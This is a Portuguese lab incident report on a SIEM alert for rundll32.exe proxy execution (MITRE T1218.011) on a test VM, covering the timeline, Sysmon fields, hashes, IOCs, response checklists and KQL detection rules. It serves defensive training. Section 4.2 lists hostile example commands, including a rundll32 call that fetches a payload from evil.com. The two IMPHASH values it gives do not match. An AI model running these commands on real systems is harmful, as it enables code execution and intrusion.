# 📋 Relatório de Incidente — IR-001

---

## Informações Gerais

| Campo | Detalhe |
|---|---|
| **ID do Incidente** | IR-001 |
| **Título** | Execução Suspeita de Rundll32.exe — LOLBin Abuse |
| **Alert UUID** | `3d970103f37a64c80894cb498ce1cbed5b4c2ef0f80849a64624936e4be02417` |
| **Rule UUID** | `748b4124-54fb-4fda-ae53-9ca44fd55499` |
| **Data de Detecção** | 2026-05-23 |
| **Horário do Evento** | 01:43:56 UTC |
| **Horário do Alerta** | 01:48:04 UTC |
| **Tempo de Detecção** | ~4 minutos após o evento |
| **Analista** | Henri Lopes |
| **Severidade** | 🟡 Medium |
| **Risk Score** | 47 |
| **Status** | ✅ Resolvido |
| **Técnica MITRE** | T1218.011 — Signed Binary Proxy Execution: Rundll32 |
| **Tática MITRE** | Defense Evasion |

---

## 1. Resumo Executivo

Em 2026-05-23 às 01:48:04 UTC, o Kibana SIEM gerou um alerta de severidade **Medium** identificando a execução suspeita do processo `rundll32.exe` no host `DESKTOP-2AHHAUL`, sob o usuário `DESKTOP-2AHHAUL\VM`.

O processo foi invocado com a linha de comando `rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh`, tendo como processo pai `svchost.exe` rodando sob a conta `AUTORIDADE NT\SISTEMA`. Esta combinação caracteriza uma técnica conhecida como **Living off the Land (LOLBin)**, onde binários legítimos e assinados do Windows são abusados para executar código arbitrário e evadir controles de segurança.

A detecção foi realizada pelo **Sysmon (Event ID 1 — Process Creation)** e o alerta foi gerado pela regra **Suspicious Rundll32 Execution - T1218**, rodando a cada 1 minuto com uma janela de lookback de 6 minutos.

A simulação foi realizada via **Atomic Red Team (T1218.011)** em ambiente controlado de laboratório.

---

## 2. Linha do Tempo

| Horário (UTC) | Evento |
|---|---|
| 01:43:56 | Execução de `rundll32.exe` registrada pelo Sysmon (Event ID 1) |
| 01:43:58 | Winlogbeat processa e envia o evento ao Elasticsearch |
| 01:48:00 | Detection rule executada pelo Kibana SIEM |
| 01:48:04 | Alerta gerado — `kibana.alert.start: 2026-05-23T01:48:04.629Z` |
| 01:48:04 | Alerta classificado como **open** e disponível para triagem |

---

## 3. Detecção

### 3.1 Regra Disparada

| Campo | Valor |
|---|---|
| **Nome da Regra** | Suspicious Rundll32 Execution - T1218 |
| **Rule ID** | `aab93b80-4353-4886-aea6-650f3f734ab2` |
| **Tipo** | Custom Query Rule |
| **Severidade** | Medium |
| **Risk Score** | 47 |
| **Intervalo de execução** | 1 minuto |
| **Lookback** | 6 minutos (`now-6m`) |
| **Query KQL** | `event.provider: "Microsoft-Windows-Sysmon" and event.code: "1" and winlog.event_data.Image: *rundll32*` |
| **Kibana Version** | 8.19.15 |

### 3.2 Evento Original (Sysmon)

| Campo | Valor |
|---|---|
| **Event ID** | 1 — Process Create |
| **Provider** | Microsoft-Windows-Sysmon |
| **Canal** | Microsoft-Windows-Sysmon/Operational |
| **Record ID** | 4265 |
| **UtcTime** | 2026-05-23 01:43:56.670 |
| **Host** | DESKTOP-2AHHAUL |
| **Agent ID** | `7c57b5e5-794f-4640-9c9a-d0408c59c3e3` |
| **Agent Version** | Winlogbeat 9.4.1 |

### 3.3 Detalhes do Processo

| Campo | Valor |
|---|---|
| **Image** | `C:\Windows\System32\rundll32.exe` |
| **OriginalFileName** | `RUNDLL32.EXE` |
| **CommandLine** | `rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh` |
| **ProcessId** | 2984 |
| **ProcessGuid** | `{4429F9B4-065C-6A11-AA01-000000000800}` |
| **CurrentDirectory** | `C:\Windows\system32\` |
| **IntegrityLevel** | Medium |
| **TerminalSessionId** | 1 |
| **User** | `DESKTOP-2AHHAUL\VM` |
| **LogonId** | `0x1f4f7` |

### 3.4 Processo Pai

| Campo | Valor |
|---|---|
| **ParentImage** | `C:\Windows\System32\svchost.exe` |
| **ParentCommandLine** | `C:\Windows\system32\svchost.exe -k wsappx -p` |
| **ParentProcessId** | 4236 |
| **ParentProcessGuid** | `{4429F9B4-0306-6A11-7601-000000000800}` |
| **ParentUser** | `AUTORIDADE NT\SISTEMA` |

### 3.5 Hashes do Binário

| Algoritmo | Hash |
|---|---|
| **MD5** | `100F56A73211E0B2BCD076A55E6393FD` |
| **SHA256** | `00BE065F405E93233CC2F0012DEFDCBB1D6817B58969D5FFD9FD72FC4783C6F4` |
| **IMPHASH** | `4DB27267734D1576D75C991DC70F68AA` |

> ✅ Hashes correspondem ao binário legítimo da Microsoft (`FileVersion: 10.0.19041.3636 WinBuild.160101.0800`, `Company: Microsoft Corporation`). O binário em si não é malicioso — o abuso está na forma como foi invocado.

---

## 4. Análise Técnica

### 4.1 O que é o Rundll32?

`rundll32.exe` é um binário legítimo do Windows localizado em `C:\Windows\System32\`, responsável por carregar e executar funções exportadas de arquivos DLL. Por ser assinado digitalmente pela Microsoft e presente em todas as versões do Windows, é frequentemente classificado como confiável por antivírus e ferramentas de segurança.

### 4.2 Técnica MITRE — T1218.011

**Tática:** Defense Evasion  
**Técnica:** Signed Binary Proxy Execution  
**Sub-técnica:** Rundll32

Atacantes utilizam `rundll32.exe` como proxy para executar código malicioso sem precisar criar novos executáveis, evadindo whitelists e controles baseados em assinatura digital.

**Exemplos de uso malicioso:**
```cmd
# Executar DLL maliciosa
rundll32.exe malicious.dll,EntryPoint

# Executar JavaScript via mshtml
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "

# Baixar e executar payload remoto
rundll32.exe url.dll,OpenURL http://evil.com/payload.dll
```

### 4.3 Análise da CommandLine Detectada

```
rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
```

| Componente | Análise |
|---|---|
| `rundll32.exe` | Binário legítimo do Windows |
| `AppXDeploymentExtensions.OneCore.dll` | DLL relacionada ao sistema de pacotes AppX |
| `ShellRefresh` | Função exportada pela DLL |

**Avaliação:** Esta invocação específica pode ser legítima (relacionada ao sistema AppX do Windows) ou pode representar uma simulação da técnica via Atomic Red Team. Em ambiente de produção, seria necessário correlacionar com outros eventos para confirmar maliciosidade.

### 4.4 Análise do Processo Pai

O processo pai identificado foi `svchost.exe -k wsappx -p`:

- `wsappx` é um grupo de serviços relacionado à Windows Store e AppX
- É plausível que serviços AppX invoquem `rundll32.exe` para operações legítimas
- Em um cenário de ataque real, `svchost.exe` sendo pai de `rundll32.exe` com argumentos incomuns seria altamente suspeito

### 4.5 Índice de Suspeição

| Fator | Avaliação | Peso |
|---|---|---|
| Binário legítimo abusado (LOLBin) | ⚠️ Suspeito | Alto |
| Hash válido da Microsoft | ✅ Legítimo | Médio |
| Processo pai svchost.exe | ⚠️ Contextual | Médio |
| Usuário não privilegiado | ✅ Baixo risco | Baixo |
| IntegrityLevel Medium | ✅ Não elevado | Baixo |
| Volume de execuções (35x) | 🔴 Alto | Alto |
| Confirmado via Atomic Red Team | ✅ Simulação | — |

**Conclusão:** Comportamento confirmado como simulação de ataque via Atomic Red Team. Em ambiente de produção, o volume elevado de execuções (35 alertas) e o padrão de invocação exigiriam investigação imediata.

---

## 5. Indicadores de Comprometimento (IOCs)

| Tipo | Valor | Contexto |
|---|---|---|
| **Process** | `C:\Windows\System32\rundll32.exe` | Binário abusado |
| **CommandLine** | `rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh` | Invocação suspeita |
| **MD5** | `100F56A73211E0B2BCD076A55E6393FD` | Hash do binário |
| **SHA256** | `00BE065F405E93233CC2F0012DEFDCBB1D6817B58969D5FFD9FD72FC4783C6F4` | Hash do binário |
| **IMPHASH** | `4DB27267734D1576D75C991DC70F68AC` | Import hash |
| **Host** | `DESKTOP-2AHHAUL` | Máquina afetada |
| **Usuário** | `DESKTOP-2AHHAUL\VM` | Conta executora |
| **Parent Process** | `svchost.exe -k wsappx -p` | Processo pai |
| **ProcessId** | `2984` | PID do processo |

---

## 6. Contenção

> ⚠️ Em ambiente de produção, as seguintes ações seriam tomadas:

### 6.1 Ações Imediatas (0-1h)
- [ ] Isolar o host `DESKTOP-2AHHAUL` da rede
- [ ] Suspender a sessão do usuário `DESKTOP-2AHHAUL\VM`
- [ ] Bloquear hash SHA256 no EDR
- [ ] Capturar dump de memória para análise forense

### 6.2 Ações de Curto Prazo (1-24h)
- [ ] Buscar o mesmo CommandLine em outros hosts da rede
- [ ] Verificar persistência (registro, tarefas agendadas, serviços)
- [ ] Analisar conexões de rede após a execução do rundll32
- [ ] Verificar arquivos criados/modificados no mesmo período

**Query para busca lateral:**
```kql
event.provider: "Microsoft-Windows-Sysmon" and 
event.code: "1" and 
winlog.event_data.CommandLine: "rundll32.exe AppXDeploymentExtensions*"
```

---

## 7. Erradicação

> ⚠️ Em ambiente de produção:

- [ ] Identificar e remover DLL maliciosa se confirmada
- [ ] Revogar credenciais comprometidas
- [ ] Revisar e corrigir configurações de segurança
- [ ] Aplicar patches pendentes no host afetado

---

## 8. Recuperação

> ⚠️ Em ambiente de produção:

- [ ] Validar integridade do sistema antes de reconectar à rede
- [ ] Monitorar host por 30 dias após contenção
- [ ] Confirmar ausência de persistência residual
- [ ] Restaurar de backup limpo se necessário

---

## 9. Lições Aprendidas

### O que funcionou bem
- ✅ Sysmon capturou todos os detalhes: hash, commandline, processo pai, usuário
- ✅ Winlogbeat enviou o evento em menos de 2 segundos
- ✅ Detection rule disparou em ~4 minutos após o evento
- ✅ Alert UUID e dados completos disponíveis para investigação forense

### Oportunidades de melhoria

**1. Reduzir falsos positivos**

Adicionar exceção para execuções legítimas conhecidas:
```kql
event.provider: "Microsoft-Windows-Sysmon" and
event.code: "1" and
winlog.event_data.Image: *rundll32* and
NOT winlog.event_data.CommandLine: (*AppXDeploymentExtensions* and *ShellRefresh*)
```

**2. Regra mais específica para uso malicioso**
```kql
event.provider: "Microsoft-Windows-Sysmon" and
event.code: "1" and
winlog.event_data.Image: *rundll32* and
winlog.event_data.CommandLine: (*javascript* or *http* or *ftp* or *\\..\\*)
```

**3. Correlacionar com conexão de rede subsequente**
```kql
event.provider: "Microsoft-Windows-Sysmon" and
event.code: "3" and
winlog.event_data.Image: *rundll32*
```

---

## 10. Referências

| Fonte | Link |
|---|---|
| MITRE ATT&CK T1218.011 | https://attack.mitre.org/techniques/T1218/011/ |
| Atomic Red Team T1218.011 | https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md |
| LOLBins — Rundll32 | https://lolbas-project.github.io/lolbas/Binaries/Rundll32/ |
| Sysmon Event ID 1 | https://learn.microsoft.com/sysinternals/downloads/sysmon |
| SwiftOnSecurity Sysmon Config | https://github.com/SwiftOnSecurity/sysmon-config |

---

## 11. Classificação Final

| Campo | Valor |
|---|---|
| **Tipo de Incidente** | Defense Evasion — LOLBin Abuse |
| **Vetor** | Execução local via binário legítimo do Windows |
| **Impacto** | Baixo (ambiente controlado de laboratório) |
| **Falso Positivo?** | Não — comportamento confirmado via Atomic Red Team T1218.011 |
| **Ação Tomada** | Documentado, analisado e monitorado |
| **Data de Fechamento** | 2026-05-23 |
| **Analista** | Henri Lopes |

---

*Este relatório foi produzido em ambiente de laboratório para fins educacionais.*  
*Todas as simulações foram realizadas em máquinas virtuais próprias e isoladas.*  
*Dados de alerta extraídos diretamente do Kibana SIEM — índice `.internal.alerts-security.alerts-default-000001`*